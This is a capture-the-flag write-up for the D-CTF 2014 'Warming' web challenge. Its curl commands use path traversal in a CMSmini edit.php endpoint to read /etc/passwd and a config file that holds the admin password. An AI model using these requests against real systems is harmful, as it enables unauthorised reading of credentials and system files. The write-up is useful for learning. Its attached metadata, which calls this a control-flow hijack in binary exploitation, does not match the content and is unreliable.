---
SOURCE: github_writeups
URL: https://raw.githubusercontent.com/ctfs/writeups/master/d-ctf-2014/web-200/README.md
CHALLENGE: README
EVENT: GitHub - ctfs/writeups
TEAM: N/A
CATEGORY: other
DIFFICULTY: Unknown
PROTECTIONS: None
KEY_FUNCTIONS: None
KEY_TECHNIQUE: The writeup describes a other vulnerability to hijack the control flow.
---
# D-CTF 2014: Web 200 – Warming

**Category:** Web
**Points:** 200
**Description:**

> A rose like any other name has spikes 10.13.37.12.

## Write-up

`http://10.13.37.12/` displays an image, located at `/cms/roses.jpg`, that says:

> “Roses may say “I love you,”

Note the missing `”` at the end – it seems this quotation is incomplete.

Based on the image URL, let’s check out the `/cms/` path. It redirects to `/cms/admin/login.php` which displays a login form. In the HTML source we find:

```html
<title>CMSmini - administration page</title>
```

A Google search for known [CMS Mini](http://sourceforge.net/projects/cmsmini/) vulnerabilities reveals [multiple vulnerabilities in v0.2.2](http://www.exploit-db.com/exploits/28128/), among which file inclusion:

```
http://
[target/IP]/cmsmini/admin/edit.php?path=&name=../../../../../etc/passwd
```

Let’s see if the given site is vulnerable (i.e. if it’s running v0.2.2 or older):

```bash
$ curl 'http://10.13.37.12/cms/admin/edit.php?path=&name=../../../../../../etc/passwd'
```

And indeed, this returns the contents of `/etc/passwd` as part of the response.

After studying the CMS Mini source code, we learn that its configuration file is stored in `cms/admin/config.php`. Let’s find out what its contents are for this server:

```bash
$ curl -s 'http://10.13.37.12/cms/admin/edit.php?path=&name=../../../../var/www/cms/admin/config.php'
…
$admin_login = 'admin';
$admin_pass = 'RosesmaysayIloveyoubutthecactussaysFuckoff';
…
```

The flag is `RosesmaysayIloveyoubutthecactussaysFuckoff`.

## Other write-ups and resources

* none yet

[Additional Context: This documentation page explains the details of README in the scope of binary exploitation and CTF pwn challenges. It covers core concepts related to other and includes references for learning other techniques.]